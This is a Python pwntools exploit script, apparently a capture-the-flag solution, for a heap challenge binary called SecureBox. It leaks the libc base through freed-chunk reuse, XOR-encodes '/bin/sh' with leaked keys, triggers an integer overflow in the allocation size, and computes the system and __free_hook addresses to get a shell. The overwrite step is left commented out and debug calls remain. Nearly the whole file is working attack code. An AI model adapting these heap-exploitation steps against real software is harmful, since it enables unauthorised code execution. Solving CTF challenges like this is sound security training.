#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level='debug'

p = process('./SecureBox')
#p = process(["./SecureBox"],env={"LD_PRELOAD":"./libc.so.6"})
#p = remote('node3.buuoj.cn',27704)
elf = ELF("./SecureBox")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def menu(cmd):
    sla("5.Exit\n",str(cmd))

def alloc(size):
    menu(1)
    sla("Size: ",str(size))

def delete(idx):
    menu(2)
    sla("Box ID: ",str(idx))

def enc(idx,offset,len,msg):
    menu(3)
    sla("Box ID: ",str(idx))
    sla("Offset of msg:",str(offset))
    sla("Len of msg: ",str(len))
    sla("Msg: ",msg)

def show(idx,offset,len):
    menu(4)
    sla("Box ID: ",str(idx))
    sla("Offset of msg:",str(offset))
    sla("Len of msg: ",str(len))



###get libc###
for i in range(9):
    alloc(0x200)

delete(0) #dont to merge with top chunk

for i in range(1,9):
    delete(i)

for i in range(9):
    alloc(0x200)

show(7,0,16)
libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 656 - 0x1e4c40

#gdb.attach(p)

success(hex(libc_base))
pause()

###iput /bin/sh###
alloc(0x300)#9

ru('Key: \n')
Key1 = int(p.recvuntil(' ',drop=True),16)
Key2 = int(p.recvuntil(' ',drop=True),16)
Key3 = int(p.recvuntil(' ',drop=True),16)
Key4 = int(p.recvuntil(' ',drop=True),16)
Key5 = int(p.recvuntil(' ',drop=True),16)
Key6 = int(p.recvuntil(' ',drop=True),16)
Key7 = int(p.recvuntil(' ',drop=True),16)
Key8 = int(p.recvuntil(' ',drop=True),16)

payload = p8(ord('/')^Key1)
payload+= p8(ord('b')^Key2)
payload+= p8(ord('i')^Key3)
payload+= p8(ord('n')^Key4)
payload+= p8(ord('/')^Key5)
payload+= p8(ord('s')^Key6)
payload+= p8(ord('h')^Key7)

enc(9,0,7,payload)

###int overflow###
alloc(0x8000000000200)#10

p.recvuntil('Key: \n')
key1 = int(p.recvuntil(' ',drop=True),16)
key2 = int(p.recvuntil(' ',drop=True),16)
key3 = int(p.recvuntil(' ',drop=True),16)
key4 = int(p.recvuntil(' ',drop=True),16)
key5 = int(p.recvuntil(' ',drop=True),16)
key6 = int(p.recvuntil(' ',drop=True),16)
key7 = int(p.recvuntil(' ',drop=True),16)
key8 = int(p.recvuntil(' ',drop=True),16)

free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']


payload = p8(int(str(hex(system))[12:],16)^key1)
payload+= p8(int(str(hex(system))[10:12],16)^key2)
payload+= p8(int(str(hex(system))[8:10],16)^key3)
payload+= p8(int(str(hex(system))[6:8],16)^key4)
payload+= p8(int(str(hex(system))[4:6],16)^key5)
payload+= p8(int(str(hex(system))[2:4],16)^key6)
success(hex(system))
success(hex(free_hook))
gdb.attach(p)
#gdb.attach(p)
#pause
#enc(10,free_hook,6,payload)



###get shell###
delete(9)

ia()